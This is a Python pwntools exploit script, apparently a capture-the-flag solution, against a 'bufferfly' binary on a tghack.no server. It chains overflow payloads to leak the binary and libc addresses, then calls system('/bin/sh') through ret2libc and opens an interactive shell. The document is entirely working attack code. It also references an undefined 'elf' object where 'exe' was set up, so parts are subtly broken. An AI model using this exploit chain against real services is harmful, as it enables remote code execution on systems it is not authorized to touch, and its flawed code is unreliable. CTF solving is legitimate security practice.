#!/usr/bin/env python3

import re
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./bufferfly')
#libc = ELF("/lib/i386-linux-gnu/libc.so.6")
#libc = ELF("./libc6-amd64_2.27-3ubuntu1_i386.so")
libc = ELF("libc6-i386_2.27-3ubuntu1_amd64.so")

host = args.HOST or 'bufferfly.tghack.no'
port = int(args.PORT or 6002)

def local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

io = start()
io.recvuntil('"Welcome! Please identify yourself."\n')

payload = (
    b"A" * 17 +
    p8(0) +
    p32(25)
)

io.sendline(payload)
data = io.recvuntil("Were do you wanna go now?\n")

supersecret_base = int(re.search(b"the one at (0x[0-9a-f]+)!", data).group(1), 16)
elf.address = supersecret_base - 0x805

log.info("Leak: 0x%x", supersecret_base)
log.info("ELF: 0x%x", elf.address)


payload = (
    b"A" * 20 +
    b"B" * 12 +
    p32(supersecret_base)
)
io.sendline(payload)

io.recvuntil('"So, what where you looking for?"\n')
io.sendline("mprotec")
data = io.recvuntil('Okay, so do you wanna see anything else or are you done?\n')

mprotect = int(re.search(b"in fact: (0x[0-9a-f]+).\n", data).group(1), 16)
libc.address = mprotect - libc.sym.mprotect

log.info("Mprotect: 0x%x", mprotect)
log.info("Libc: 0x%x", libc.address)

payload = (
    b"done\x00" +
    b"A" * 79 +
    p32(libc.sym.system) +
    b"B" * 4 +
    p32(next(libc.search(b"/bin/sh")))
)
io.sendline(payload)

io.interactive()
